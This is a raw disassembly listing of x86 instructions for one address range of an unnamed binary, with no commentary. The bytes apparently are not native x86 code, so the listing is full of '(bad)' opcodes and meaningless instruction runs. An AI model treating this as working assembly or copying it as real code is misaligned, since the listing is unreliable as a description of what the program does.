11003a53:	add    ch,BYTE PTR [edi+0x19]
11003a56:	add    BYTE PTR [eax],al
11003a58:	or     dl,BYTE PTR [edi]
11003a5a:	pop    ecx
11003a5b:	inc    BYTE PTR [esi+edx*1]
11003a5e:	inc    BYTE PTR [ecx]
11003a60:	or     eax,0x420
11003a65:	add    BYTE PTR [ebx],dl
11003a67:	add    al,0x38
11003a69:	daa    
11003a6a:	(bad)  
11003a6b:	(bad)  
11003a6c:	dec    DWORD PTR [ecx]
11003a6e:	cmp    dh,cl
11003a70:	add    BYTE PTR [eax],al
11003a72:	add    BYTE PTR [eax],ah
11003a74:	or     DWORD PTR [eax],eax
11003a76:	add    BYTE PTR [eax],al
11003a78:	adc    eax,DWORD PTR [eax+edi*1]
11003a7b:	adc    eax,0x2bffffff
11003a80:	bound  eax,QWORD PTR [esi]
11003a82:	or     al,0x20
11003a84:	adc    al,0x0
11003a86:	add    BYTE PTR [eax],al
11003a88:	adc    eax,DWORD PTR [eax+edi*1]
11003a8b:	add    eax,0x38ffffff
11003a90:	bound  eax,QWORD PTR [ecx]
11003a92:	add    BYTE PTR [eax],al
11003a94:	and    BYTE PTR ds:0x13000000,cl
11003a9a:	add    al,0x38
11003a9c:	hlt    
11003a9d:	(bad)  
11003a9e:	(bad)  
11003a9f:	inc    DWORD PTR [esi]
11003aa1:	pop    es
11003aa2:	cmp    eax,0xe8
11003aa7:	and    BYTE PTR [eax],dl
11003aa9:	add    BYTE PTR [eax],al
11003aab:	add    BYTE PTR [ebx],dl
11003aad:	add    al,0x38
11003aaf:	loope  0x11003aaf
11003ab1:	(bad)  
11003ab2:	(bad)  
11003ab3:	cmp    BYTE PTR [ebp+0x17000000],bl
11003ab9:	sub    eax,DWORD PTR [ebx]
11003abb:	push   ss
11003abc:	sub    eax,DWORD PTR [eax]
11003abe:	sub    al,0x0
11003ac0:	add    eax,DWORD PTR [edx]
11003ac2:	push   ecx
11003ac3:	and    BYTE PTR [edi],cl
11003ac5:	add    BYTE PTR [eax],al
11003ac7:	add    BYTE PTR [ebx],dl
11003ac9:	add    al,0x38
11003acb:	(bad)  
11003ace:	jmp    FWORD PTR [ebx]
11003ad0:	sub    esp,DWORD PTR [eax]
11003ad2:	or     BYTE PTR [eax],al
11003ad4:	add    BYTE PTR [eax],al
11003ad6:	adc    eax,DWORD PTR [eax+edi*1]
11003ad9:	mov    bh,0xfe
11003adb:	(bad)  
11003adc:	call   DWORD PTR [edi]
11003ade:	cmp    al,dl
11003ae0:	add    BYTE PTR [eax],al
11003ae2:	add    BYTE PTR [edx+eax*1],al
11003ae5:	or     BYTE PTR [edi],dl
11003ae7:	pop    eax
11003ae8:	outs   dx,DWORD PTR ds:[esi]
11003ae9:	sub    eax,0x510a0000
11003aee:	and    BYTE PTR [edi],dl
11003af0:	add    BYTE PTR [eax],al
11003af2:	add    BYTE PTR [ebx],dl
11003af4:	add    al,0x38
11003af6:	call   0x368:0x2bfffffe
11003afd:	push   eax
11003afe:	outs   dx,DWORD PTR ds:[esi]
11003aff:	sbb    DWORD PTR [eax],eax
11003b01:	add    BYTE PTR [edx],cl
11003b03:	sbb    bh,dh
11003b05:	add    dl,BYTE PTR [esi]
11003b07:	inc    BYTE PTR [ecx]
11003b09:	or     eax,0x1320
11003b0e:	add    BYTE PTR [ebx],dl
11003b10:	add    al,0x38
11003b12:	jle    0x11003b12
11003b14:	(bad)  
11003b15:	dec    DWORD PTR [ecx]
11003b17:	cmp    al,BYTE PTR [edx]
11003b19:	add    DWORD PTR [eax],eax
11003b1b:	add    BYTE PTR [eax],ah
11003b1d:	push   es
11003b1e:	add    BYTE PTR [eax],al
11003b20:	add    BYTE PTR [ebx],dl
11003b22:	add    al,0x38
11003b24:	ins    BYTE PTR es:[edi],dx
11003b25:	(bad)  
11003b26:	(bad)  
11003b27:	jmp    FWORD PTR [ebx]
11003b29:	dec    ecx
11003b2a:	push   es
11003b2b:	adc    eax,0xfe1601fe
11003b30:	add    DWORD PTR ds:0x320,ecx
11003b36:	add    BYTE PTR [ebx],dl
11003b38:	add    al,0x38
11003b3a:	push   esi
11003b3b:	(bad)  
11003b3c:	(bad)  
11003b3d:	dec    DWORD PTR [ecx]
11003b3f:	cmp    bh,BYTE PTR ds:0x20ffffff
11003b45:	add    DWORD PTR [eax],eax
11003b47:	add    BYTE PTR [eax],al
11003b49:	adc    eax,DWORD PTR [eax+edi*1]
11003b4c:	inc    esp
11003b4d:	(bad)  
11003b4e:	(bad)  
11003b4f:	(bad)  
11003b50:	cmp    BYTE PTR [ecx+0x20000000],dl
11003b56:	sbb    BYTE PTR [eax],al
11003b58:	add    BYTE PTR [eax],al
11003b5a:	adc    eax,DWORD PTR [eax+edi*1]
11003b5d:	xor    edi,esi
11003b5f:	(bad)  
11003b60:	inc    DWORD PTR [esi]
11003b62:	sub    esi,DWORD PTR [ebx+0x0]
11003b65:	and    BYTE PTR ds:0x13000000,dl
11003b6b:	add    al,0x38
11003b6d:	and    edi,esi
11003b6f:	(bad)  
11003b70:	jmp    FWORD PTR [ebx]
11003b72:	mov    DWORD PTR [ebx],eax
11003b74:	add    edx,DWORD PTR [eax+0x16]
11003b77:	sbb    ch,BYTE PTR [edi+0x2f]
11003b7a:	add    BYTE PTR [eax],al
11003b7c:	or     dl,BYTE PTR [ecx+0x20]
11003b7f:	add    al,BYTE PTR [eax]
11003b81:	add    BYTE PTR [eax],al
11003b83:	adc    eax,DWORD PTR [eax+edi*1]
11003b86:	or     bh,dh
11003b88:	(bad)  
11003b89:	(bad)  
11003b8a:	cmp    BYTE PTR [edi+0x20000000],cl
11003b90:	or     al,0x0
11003b92:	add    BYTE PTR [eax],al
11003b94:	adc    eax,DWORD PTR [eax+edi*1]
11003b97:	stc    
11003b98:	std    
11003b99:	(bad)  
11003b9a:	inc    DWORD PTR [edi]
11003b9c:	sub    edi,DWORD PTR [ecx]
11003b9e:	and    BYTE PTR [ecx],dl
11003ba0:	add    BYTE PTR [eax],al
11003ba2:	add    BYTE PTR [ebx],dl
11003ba4:	add    al,0x38
11003ba6:	jmp    0xfe15:0x7fffffd
11003bad:	add    dl,BYTE PTR [esi]
11003baf:	inc    BYTE PTR [ecx]
11003bb1:	sub    eax,DWORD PTR [eax]
11003bb3:	or     eax,0x20
11003bb8:	add    BYTE PTR [ebx],dl
11003bba:	add    al,0x38
11003bbc:	aam    0xfd
11003bbe:	(bad)  
11003bbf:	dec    DWORD PTR [ecx]
11003bc1:	cmp    ah,BYTE PTR [edi+edi*8-0x1]
11003bc5:	jmp    DWORD PTR [eax]
11003bc7:	push   ss
11003bc8:	add    BYTE PTR [eax],al
11003bca:	add    BYTE PTR [ebx],dl
11003bcc:	add    al,0x38
11003bce:	ret    0xfffd
11003bd1:	(bad)  
11003bd2:	cmp    BYTE PTR [ebp+0xcfffffe],bh
11003bd8:	and    BYTE PTR [esi],cl
11003bda:	add    BYTE PTR [eax],al
11003bdc:	add    BYTE PTR [ebx],dl
11003bde:	add    al,0x38
11003be0:	mov    al,0xfd
11003be2:	(bad)  
11003be3:	jmp    FWORD PTR [ebx]
11003be5:	adc    BYTE PTR [edi],al
11003be7:	or     al,0x20
11003be9:	add    eax,0x13000000
11003bee:	add    al,0x38
11003bf0:	mov    al,ds:0x2bfffffd
11003bf5:	add    BYTE PTR [eax],cl
11003bf7:	push   ss
11003bf8:	inc    BYTE PTR [ecx*1+0xa20]
11003bff:	add    BYTE PTR [ebx],dl
11003c01:	add    al,0x38
11003c03:	(bad)  
11003c04:	std    
11003c05:	(bad)  
11003c06:	dec    DWORD PTR [ecx]
11003c08:	cmp    ch,BYTE PTR [ebx+0x20fffffe]
11003c0e:	adc    al,BYTE PTR [eax]
11003c10:	add    BYTE PTR [eax],al
11003c12:	adc    eax,DWORD PTR [eax+edi*1]
11003c15:	jnp    0x11003c14
11003c17:	(bad)  
11003c18:	(bad)  
11003c19:	cmp    BYTE PTR [ecx],ch
11003c1b:	(bad)  
11003c1c:	(bad)  
11003c1d:	jmp    FWORD PTR [edx]
11003c1f:	add    BYTE PTR [ebx],dl
11003c21:	xor    BYTE PTR [eax+eax*1],al
11003c24:	mov    ah,0x0
11003c26:	add    BYTE PTR [eax],al
11003c28:	add    eax,DWORD PTR [eax]
11003c2a:	add    BYTE PTR [ecx],dl
11003c2c:	sub    ebx,DWORD PTR [esi]
11003c2e:	or     DWORD PTR [ebp+0x6],eax
11003c31:	add    BYTE PTR [eax],al
11003c33:	add    BYTE PTR [ebx],ah
11003c35:	add    BYTE PTR [eax],al
11003c37:	add    BYTE PTR [edx+0x0],ch
11003c3a:	add    BYTE PTR [eax],al
11003c3c:	dec    eax
11003c3d:	add    BYTE PTR [eax],al
11003c3f:	add    BYTE PTR [eax],bl
11003c41:	add    BYTE PTR [eax],al
11003c43:	add    BYTE PTR [ebx+0x0],dl
11003c46:	add    BYTE PTR [eax],al
11003c48:	das    
11003c49:	add    BYTE PTR [eax],al
11003c4b:	add    BYTE PTR [eax],al
11003c4d:	add    dh,BYTE PTR [edx-0x39]
11003c50:	add    DWORD PTR [eax],eax
11003c52:	jo     0x11003cc3
11003c54:	adc    eax,0x160a0000
11003c59:	inc    BYTE PTR [ecx]
11003c5b:	or     esp,DWORD PTR [eax]
11003c5d:	add    eax,DWORD PTR [eax]
11003c5f:	add    BYTE PTR [eax],al
11003c61:	or     eax,0x2d07ca2b
11003c66:	push   ss
11003c67:	and    BYTE PTR [eax],al
11003c69:	add    BYTE PTR [eax],al
11003c6b:	add    BYTE PTR ds:0x302bbf2b,cl
11003c71:	push   ss
11003c72:	or     ah,BYTE PTR [eax]
11003c74:	add    eax,0xd000000
11003c79:	sub    esi,DWORD PTR [ebx+0x7202612b]
11003c7f:	iret   
11003c80:	add    DWORD PTR [eax],eax
11003c82:	jo     0x11003cf3
11003c84:	adc    eax,0x160a0000
11003c89:	inc    BYTE PTR [ecx]
11003c8b:	or     esp,DWORD PTR [eax]
11003c8d:	add    al,BYTE PTR [eax]
11003c8f:	add    BYTE PTR [eax],al
11003c91:	or     eax,0x2d079a2b
11003c96:	and    DWORD PTR [eax],esp
11003c98:	add    al,0x0
11003c9a:	add    BYTE PTR [eax],al
11003c9c:	or     eax,0xd02b8f2b
11003ca1:	pop    ss
11003ca2:	or     dl,BYTE PTR [edi]
11003ca4:	sub    eax,DWORD PTR [ebx]
11003ca6:	push   ss
11003ca7:	sub    eax,DWORD PTR [eax]
11003ca9:	sub    al,0x0
11003cab:	and    BYTE PTR [ecx],al
11003cad:	add    BYTE PTR [eax],al
11003caf:	add    BYTE PTR ds:0xffff7838,cl
11003cb5:	jmp    FWORD PTR [ebx]
11003cb7:	sub    BYTE PTR es:[ebx],bl
11003cba:	add    BYTE PTR [eax],al
11003cbc:	or     dh,BYTE PTR [edx-0x2b]
11003cbf:	add    DWORD PTR [eax],eax
11003cc1:	jo     0x11003d32
11003cc3:	sbb    al,0x0
11003cc5:	add    BYTE PTR [edx],cl
11003cc7:	pop    ss
11003cc8:	lea    edx,[eax+eax*1]
11003ccb:	add    BYTE PTR [ecx],al
11003ccd:	or     al,0x8
11003ccf:	push   ss
11003cd0:	add    ah,BYTE PTR [edx+0x1d2808]
11003cd6:	add    BYTE PTR [edx],cl
11003cd8:	jae    0x11003cf8
11003cda:	add    BYTE PTR [eax],al
11003cdc:	or     bh,BYTE PTR [edx+0x6]
11003cdf:	sub    dl,BYTE PTR [ebx]
11003ce1:	xor    BYTE PTR [ebx],al
11003ce3:	add    BYTE PTR [eax+eax*1+0x40000],bh
11003cea:	add    BYTE PTR [ecx],dl
11003cec:	sub    esp,DWORD PTR [esi]
11003cee:	or     DWORD PTR [ebp+0x8],eax
11003cf1:	add    BYTE PTR [eax],al
11003cf3:	add    BYTE PTR [eax+0x0],ah
11003cf6:	add    BYTE PTR [eax],al
11003cf8:	dec    eax
11003cf9:	add    BYTE PTR [eax],al
11003cfb:	add    BYTE PTR [eax+0x52000000],dl
11003d01:	add    BYTE PTR [eax],al
11003d03:	add    BYTE PTR [ebx],bl
11003d05:	add    BYTE PTR [eax],al
11003d07:	add    BYTE PTR [eax+eax*1],bh
11003d0a:	add    BYTE PTR [eax],al
11003d0c:	jp     0x11003d0e
11003d0e:	add    BYTE PTR [eax],al
11003d10:	adc    BYTE PTR [eax],al
11003d12:	add    BYTE PTR [eax],al
11003d14:	add    BYTE PTR [edx],al
11003d16:	sub    BYTE PTR [eax],dh
11003d18:	add    BYTE PTR [eax],al
11003d1a:	or     cl,BYTE PTR [edx]
11003d1c:	and    BYTE PTR [edi],al
11003d1e:	add    BYTE PTR [eax],al
11003d20:	add    BYTE PTR ds:0x2c06ca2b,cl
11003d26:	aaa    
11003d27:	and    BYTE PTR [eax+eax*1],al
11003d2a:	add    BYTE PTR [eax],al
11003d2c:	or     eax,0x382bbf2b
11003d31:	jb     0x11003d36
11003d33:	add    al,BYTE PTR [eax]
11003d35:	jo     0x11003db5
11003d37:	xor    DWORD PTR [eax],eax
11003d39:	add    BYTE PTR [edx],cl
11003d3b:	mov    WORD PTR [edx],fs
11003d3d:	add    BYTE PTR [eax],al
11003d3f:	add    DWORD PTR [edx],eax
11003d41:	sub    BYTE PTR [edx],dh
11003d43:	add    BYTE PTR [eax],al
11003d45:	or     dl,BYTE PTR [eax]
11003d47:	add    BYTE PTR [eax],ah
11003d49:	add    eax,0xd000000
11003d4e:	sub    ebx,DWORD PTR [esi+0xb02002b]
11003d54:	and    BYTE PTR [ecx],al
11003d56:	add    BYTE PTR [eax],al
11003d58:	add    BYTE PTR ds:0x482b922b,cl
11003d5e:	and    BYTE PTR [ebx],al
11003d60:	add    BYTE PTR [eax],al
11003d62:	add    BYTE PTR ds:0x2b16882b,cl
11003d68:	sbb    DWORD PTR [eax],esp
11003d6a:	add    BYTE PTR [eax],al
11003d6c:	add    BYTE PTR [eax],al
11003d6e:	or     eax,0xffff7a38
11003d73:	inc    DWORD PTR [esi]
11003d75:	outs   dx,DWORD PTR ds:[esi]
11003d76:	sbb    DWORD PTR [eax],eax
11003d78:	add    BYTE PTR [edx],cl
11003d7a:	push   ss
11003d7b:	inc    BYTE PTR [ecx]
11003d7d:	push   ss
11003d7e:	inc    BYTE PTR [ecx]
11003d80:	sub    eax,DWORD PTR [eax]
11003d82:	or     al,0x20
11003d84:	push   es
11003d85:	add    BYTE PTR [eax],al
11003d87:	add    BYTE PTR ds:0xffff6038,cl
11003d8d:	call   DWORD PTR [edi]
11003d8f:	sub    eax,DWORD PTR [ebx]
11003d91:	push   ss
11003d92:	sub    eax,DWORD PTR [eax]
11003d94:	sub    al,0x0
11003d96:	or     BYTE PTR ds:0x220b9,ch
11003d9c:	add    BYTE PTR [eax],al
11003d9e:	or     eax,0xffff4a38
11003da3:	jmp    FWORD PTR [ebx]
11003da5:	mov    eax,DWORD PTR [edi]
11003da7:	sub    dl,BYTE PTR [ebx]
11003da9:	xor    BYTE PTR [edx],al
11003dab:	add    BYTE PTR [eax+eax*1],ch
11003dae:	add    BYTE PTR [eax],al
11003db0:	add    eax,0x110000
11003db5:	add    dl,BYTE PTR [esi+edi*8]
11003db8:	add    DWORD PTR [esi],edx
11003dba:	inc    BYTE PTR [ecx]
11003dbc:	or     al,BYTE PTR [esi]
11003dbe:	sub    eax,0x17002b1f
11003dc3:	sub    eax,DWORD PTR [ebx]
11003dc5:	push   ss
11003dc6:	sub    eax,DWORD PTR [eax]
11003dc8:	sub    al,0x0
11003dca:	sub    BYTE PTR [ebx],bl
11003dcc:	add    BYTE PTR [eax],al
11003dce:	or     dh,BYTE PTR [edx+0x7]
11003dd1:	add    al,BYTE PTR [eax]
11003dd3:	jo     0x11003e44
11003dd5:	sbb    al,0x0
11003dd7:	add    BYTE PTR [edx],cl
11003dd9:	jae    0x11003df9
11003ddb:	add    BYTE PTR [eax],al
11003ddd:	or     bh,BYTE PTR [edx+0x2a]
11003de0:	adc    esi,DWORD PTR [eax]
11003de2:	add    al,0x0
11003de4:	xor    BYTE PTR [eax],al
11003de6:	add    BYTE PTR [eax],al
11003de8:	push   es
11003de9:	add    BYTE PTR [eax],al
11003deb:	adc    DWORD PTR [edi],edx
11003ded:	sub    eax,DWORD PTR [ebx]
11003def:	push   ss
11003df0:	sub    eax,DWORD PTR [eax]
11003df2:	sub    al,0x0
11003df4:	add    BYTE PTR [eax],ch
11003df6:	sbb    eax,DWORD PTR [eax]
11003df8:	add    BYTE PTR [edx],cl
11003dfa:	jb     0x11003e31
11003dfc:	add    al,BYTE PTR [eax]
11003dfe:	jo     0x11003e6f
11003e00:	sbb    al,0x0
11003e02:	add    BYTE PTR [edx],cl
11003e04:	pop    ss
11003e05:	lea    edx,[eax+eax*1]
11003e08:	add    BYTE PTR [ecx],al
11003e0a:	or     al,BYTE PTR [esi]
11003e0c:	push   ss
11003e0d:	add    ah,BYTE PTR [edx+0x1d2806]
11003e13:	add    BYTE PTR [edx],cl
11003e15:	sub    BYTE PTR [ebx],dh
11003e17:	add    BYTE PTR [eax],al
11003e19:	or     al,BYTE PTR [eax]
11003e1b:	sub    dl,BYTE PTR [ebx]
11003e1d:	xor    BYTE PTR [eax+eax*1],al
11003e20:	dec    esp
11003e21:	add    al,BYTE PTR [eax]
11003e23:	add    BYTE PTR [edi],al
11003e25:	add    BYTE PTR [eax],al
11003e27:	adc    DWORD PTR [esi],edx
11003e29:	adc    ecx,DWORD PTR [ebx]
11003e2b:	adc    DWORD PTR [ebx],ecx
11003e2d:	inc    ebp
11003e2e:	add    DWORD PTR [eax],eax
11003e30:	add    BYTE PTR [eax],al
11003e32:	add    BYTE PTR [eax],al
11003e34:	add    BYTE PTR [eax],al
11003e36:	sub    edi,DWORD PTR [edi]
11003e38:	adc    DWORD PTR [ebx],ecx
11003e3a:	inc    ebp
11003e3b:	push   cs
11003e3c:	add    BYTE PTR [eax],al
11003e3e:	add    BYTE PTR [ebx],dl
11003e40:	add    BYTE PTR [eax],al
11003e42:	add    dh,al
11003e44:	add    BYTE PTR [eax],al
11003e46:	add    BYTE PTR [ecx-0x63ffffff],bh
11003e4c:	add    DWORD PTR [eax],eax
11003e4e:	add    BYTE PTR [eax-0x34000000],bl
11003e54:	add    DWORD PTR [eax],eax
11003e56:	add    BYTE PTR [ebx+0x38000000],dh
11003e5c:	add    BYTE PTR [eax],al
11003e5e:	add    BYTE PTR [ecx+eax*1],al
11003e61:	add    BYTE PTR [eax],al
11003e63:	push   edx
11003e64:	add    DWORD PTR [eax],eax
11003e66:	add    BYTE PTR ds:0x8c000001,dl
11003e6c:	add    DWORD PTR [eax],eax
11003e6e:	add    BYTE PTR [eax],ah
11003e70:	add    BYTE PTR [eax],al
11003e72:	add    BYTE PTR [edx+0x1],ah
11003e75:	add    BYTE PTR [eax],al
11003e77:	add    BYTE PTR [edx],al
11003e79:	adc    al,0xfe
11003e7b:	add    DWORD PTR [esi],edx
11003e7d:	inc    BYTE PTR [ecx]
11003e7f:	adc    eax,DWORD PTR [esi]
11003e81:	and    BYTE PTR [eax],al
11003e83:	add    BYTE PTR [eax],al
11003e85:	add    BYTE PTR [ebx],dl
11003e87:	or     ebp,DWORD PTR [ebx]
11003e89:	scas   al,BYTE PTR es:[edi]
11003e8a:	adc    DWORD PTR [esi],eax
11003e8c:	sub    eax,0xc204f
11003e91:	add    BYTE PTR [eax],al
11003e93:	adc    ecx,DWORD PTR [ebx]
11003e95:	sub    esp,DWORD PTR [ecx+0xa338]
11003e9b:	add    BYTE PTR [ebx],al
11003e9d:	or     DWORD PTR [ecx],edx
11003e9f:	add    al,0x6f
11003ea1:	xor    al,0x0
11003ea3:	add    BYTE PTR [edx],cl
11003ea5:	add    BYTE PTR [eax],ah
11003ea7:	pop    es
11003ea8:	add    BYTE PTR [eax],al
11003eaa:	add    BYTE PTR [ebx],dl
11003eac:	or     ebp,DWORD PTR [ebx]
11003eae:	mov    DWORD PTR [eax],edi
11003eb0:	mov    ah,0x0
11003eb2:	add    BYTE PTR [eax],al
11003eb4:	sub    BYTE PTR [ebx],bl
11003eb6:	add    BYTE PTR [eax],al
11003eb8:	or     dh,BYTE PTR [edx+0x5b]
11003ebb:	add    al,BYTE PTR [eax]
11003ebd:	jo     0x11003f2e
11003ebf:	sbb    al,0x0
11003ec1:	add    BYTE PTR [edx],cl
11003ec3:	pop    ss
11003ec4:	lea    edx,[eax+eax*1]
11003ec7:	add    BYTE PTR [ecx],al
11003ec9:	adc    eax,DWORD PTR [edi]
11003ecb:	adc    DWORD PTR [edi],eax
11003ecd:	push   ss
11003ece:	pop    es
11003ecf:	mov    ds:0x1d280711,al
11003ed4:	add    BYTE PTR [eax],al
11003ed6:	or     dh,BYTE PTR [ebx+0x1e]
11003ed9:	add    BYTE PTR [eax],al
11003edb:	or     bh,BYTE PTR [edx+0x17]
11003ede:	sub    eax,DWORD PTR [ebx]
11003ee0:	push   ss
11003ee1:	sub    eax,DWORD PTR [eax]
11003ee3:	sub    al,0x0
11003ee5:	add    dl,BYTE PTR [edi]
11003ee7:	lea    esp,[edx]
11003ee9:	add    BYTE PTR [eax],al
11003eeb:	add    DWORD PTR [ebx],edx
11003eed:	or     BYTE PTR [ecx],dl
11003eef:	or     BYTE PTR [esi],dl
11003ef1:	pop    ds
11003ef2:	sub    al,0x9d
11003ef4:	adc    DWORD PTR [eax],ecx
11003ef6:	outs   dx,DWORD PTR ds:[esi]
11003ef7:	xor    eax,0xa0a0000
11003efc:	add    BYTE PTR [esi],al
11003efe:	adc    ecx,DWORD PTR [ecx]
11003f00:	push   ss
11003f01:	adc    ecx,DWORD PTR [edx]
11003f03:	and    BYTE PTR [eax+eax*1],al
11003f06:	add    BYTE PTR [eax],al
11003f08:	adc    ecx,DWORD PTR [ebx]
11003f0a:	cmp    BYTE PTR [ecx],ch
11003f0c:	(bad)  
11003f0d:	(bad)  
11003f0e:	(bad)  
11003f0f:	cmp    BYTE PTR [eax],al
11003f11:	add    BYTE PTR [eax],al
11003f13:	add    BYTE PTR [ecx],dl
11003f15:	or     dl,BYTE PTR [ecx]
11003f17:	or     DWORD PTR [esi+0x1304fe69],ecx
11003f1d:	push   es
11003f1e:	and    BYTE PTR [esi],al
11003f20:	add    BYTE PTR [eax],al
11003f22:	add    BYTE PTR [ebx],dl
11003f24:	or     edi,DWORD PTR [eax]
11003f26:	push   cs
11003f27:	(bad)  
11003f28:	(bad)  
11003f29:	call   DWORD PTR [ecx]
11003f2b:	push   es
11003f2c:	cmp    ch,BYTE PTR [ebp+0x20000000]
11003f32:	add    DWORD PTR [eax],eax
11003f34:	add    BYTE PTR [eax],al
11003f36:	adc    ecx,DWORD PTR [ebx]
11003f38:	cmp    bl,bh
11003f3a:	(bad)  
11003f3b:	(bad)  
11003f3c:	jmp    FWORD PTR [ebx]
11003f3e:	sub    BYTE PTR ds:[ebx],bl
11003f41:	add    BYTE PTR [eax],al
11003f43:	or     dh,BYTE PTR [edx-0x65]
11003f46:	add    al,BYTE PTR [eax]
11003f48:	jo     0x11003fb9
11003f4a:	sbb    al,0x0
11003f4c:	add    BYTE PTR [edx],cl
11003f4e:	pop    ss
11003f4f:	lea    edx,[eax+eax*1]
11003f52:	add    BYTE PTR [ecx],al
11003f54:	adc    eax,DWORD PTR [edi]
11003f56:	adc    DWORD PTR [edi],eax
11003f58:	push   ss
11003f59:	add    ah,BYTE PTR [edx+0x1d280711]
11003f5f:	add    BYTE PTR [eax],al
11003f61:	or     dh,BYTE PTR [ebx+0x1e]
11003f64:	add    BYTE PTR [eax],al
11003f66:	or     bh,BYTE PTR [edx+0x0]
11003f69:	adc    DWORD PTR [edx],ecx
11003f6b:	pop    ss
11003f6c:	pop    eax
11003f6d:	adc    ecx,DWORD PTR [edx]
11003f6f:	and    BYTE PTR [eax],cl
11003f71:	add    BYTE PTR [eax],al
11003f73:	add    BYTE PTR [ebx],dl
11003f75:	or     edi,DWORD PTR [eax]
11003f77:	mov    ebp,0x2bfffffe
11003f7c:	xchg   edi,eax
11003f7d:	add    edx,DWORD PTR [ebx]
11003f7f:	add    eax,0xa20
11003f84:	add    BYTE PTR [ebx],dl
11003f86:	or     edi,DWORD PTR [eax]
11003f88:	lods   al,BYTE PTR ds:[esi]
11003f89:	(bad)  
11003f8a:	(bad)  
11003f8b:	(bad)  
11003f8c:	cmp    al,ah
11003f8e:	add    BYTE PTR [eax],al
11003f90:	add    BYTE PTR [edi],al
11003f92:	push   ss
11003f93:	or     BYTE PTR [edi+0x2f],ch
11003f96:	add    BYTE PTR [eax],al
11003f98:	or     ch,BYTE PTR [edi+0x36]
11003f9b:	add    BYTE PTR [eax],al
11003f9d:	or     cl,BYTE PTR ds:0x58170807
11003fa3:	outs   dx,DWORD PTR ds:[esi]
11003fa4:	sub    eax,0x6f0a0000
11003fa9:	add    BYTE PTR ss:[eax],al
11003fac:	or     dl,BYTE PTR [ebx]
11003fae:	add    al,0x9
11003fb0:	outs   dx,DWORD PTR ds:[esi]
11003fb1:	sbb    DWORD PTR [eax],eax
11003fb3:	add    BYTE PTR [edx],cl
11003fb5:	push   ss
11003fb6:	inc    BYTE PTR [ecx]
11003fb8:	push   ss
11003fb9:	inc    BYTE PTR [ecx]
11003fbb:	adc    eax,DWORD PTR [esi]
11003fbd:	and    BYTE PTR [ecx],cl
11003fbf:	add    BYTE PTR [eax],al
11003fc1:	add    BYTE PTR [ebx],dl
11003fc3:	or     edi,DWORD PTR [eax]
11003fc5:	outs   dx,DWORD PTR ds:[esi]
11003fc6:	(bad)  
11003fc7:	(bad)  
11003fc8:	call   DWORD PTR [ecx]
11003fca:	push   es
11003fcb:	sub    eax,0xd2048
11003fd0:	add    BYTE PTR [eax],al
11003fd2:	adc    ecx,DWORD PTR [ebx]
11003fd4:	cmp    BYTE PTR [edi-0x2],bl
11003fd7:	(bad)  
11003fd8:	(bad)  
11003fd9:	cmp    dh,dl
11003fdb:	(bad)  
11003fdc:	(bad)  
11003fdd:	call   DWORD PTR [ecx]
11003fdf:	or     DWORD PTR [ecx],edx
11003fe1:	or     bl,BYTE PTR [edx+0x7207000b]
11003fe7:	mov    edi,0x6f700001
11003fec:	add    BYTE PTR cs:[eax],al
11003fef:	or     cl,BYTE PTR [eax+ecx*1]
11003ff2:	push   ss
11003ff3:	inc    BYTE PTR [edx]
11003ff5:	adc    eax,DWORD PTR [esi]
11003ff7:	and    BYTE PTR [ebx],cl
11003ff9:	add    BYTE PTR [eax],al
11003ffb:	add    BYTE PTR [ebx],dl
11003ffd:	or     edi,DWORD PTR [eax]
11003fff:	xor    eax,0x11fffffe
11004004:	push   es
11004005:	sub    eax,0x3208a
1100400a:	add    BYTE PTR [eax],al
1100400c:	adc    ecx,DWORD PTR [ebx]
1100400e:	cmp    BYTE PTR ds:0x2bfffffe,ah
11004014:	xor    eax,DWORD PTR [ebx]
11004016:	or     DWORD PTR [edi+0x1f],ebp
11004019:	add    BYTE PTR [eax],al
1100401b:	or     dl,BYTE PTR [esi+edi*8]
1100401e:	add    DWORD PTR [esi],edx
11004020:	inc    BYTE PTR [ecx]
11004022:	adc    eax,DWORD PTR [esi]
11004024:	and    BYTE PTR [edx],al
11004026:	add    BYTE PTR [eax],al
11004028:	add    BYTE PTR [ebx],dl
1100402a:	or     edi,DWORD PTR [eax]
1100402c:	or     dh,bh
1100402e:	(bad)  
1100402f:	call   DWORD PTR [ecx]
11004031:	push   es
11004032:	cmp    dh,BYTE PTR [ecx]
11004034:	(bad)  
11004035:	(bad)  
11004036:	jmp    DWORD PTR [eax]
11004038:	add    eax,0x13000000
1100403d:	or     edi,DWORD PTR [eax]
1100403f:	cmc    
11004040:	std    
11004041:	(bad)  
11004042:	(bad)  
11004043:	cmp    BYTE PTR [esi+edi*8-0x1],dl
11004047:	jmp    FWORD PTR [eax]
11004049:	sbb    eax,DWORD PTR [eax]
1100404b:	add    BYTE PTR [edx],cl
1100404d:	jb     0x1100402a
1100404f:	add    al,BYTE PTR [eax]
11004051:	jo     0x110040c2
11004053:	sbb    al,0x0
11004055:	add    BYTE PTR [edx],cl
11004057:	pop    ss
11004058:	lea    edx,[eax+eax*1]
1100405b:	add    BYTE PTR [ecx],al
1100405d:	adc    eax,DWORD PTR [edi]
1100405f:	adc    DWORD PTR [edi],eax
11004061:	push   ss
11004062:	pop    es
11004063:	mov    ds:0x1d280711,al
11004068:	add    BYTE PTR [eax],al
1100406a:	or     dh,BYTE PTR [ebx+0x1e]
1100406d:	add    BYTE PTR [eax],al
1100406f:	or     bh,BYTE PTR [edx+0x11]
11004072:	add    eax,0x230132a
11004077:	add    BYTE PTR [ebx+0x0],bl
1100407a:	add    BYTE PTR [eax],al
1100407c:	or     BYTE PTR [eax],al
1100407e:	add    BYTE PTR [ecx],dl
11004080:	sub    edx,DWORD PTR [edx]
11004082:	pop    es
11004083:	inc    ebp
11004084:	add    eax,DWORD PTR [eax]
11004086:	add    BYTE PTR [eax],al
11004088:	and    DWORD PTR [eax],eax
1100408a:	add    BYTE PTR [eax],al
1100408c:	inc    esp
1100408d:	add    BYTE PTR [eax],al
1100408f:	add    BYTE PTR [esi],dl
11004091:	add    BYTE PTR [eax],al
11004093:	add    BYTE PTR [eax],al
11004095:	add    ch,BYTE PTR [eax]
11004097:	or     DWORD PTR [eax],eax
11004099:	add    BYTE PTR [esi],al
1100409b:	add    BYTE PTR [esi+0xb],bh
1100409e:	add    BYTE PTR [eax],al
110040a0:	add    al,0xa
110040a2:	and    BYTE PTR [edx],al
110040a4:	add    BYTE PTR [eax],al
110040a6:	add    BYTE PTR [ebx],cl
110040a8:	sub    ebx,eax
110040aa:	push   es
110040ab:	sub    eax,0x202d
110040b0:	add    BYTE PTR [eax],al
110040b2:	or     ebp,DWORD PTR [ebx]
110040b4:	int    0x17
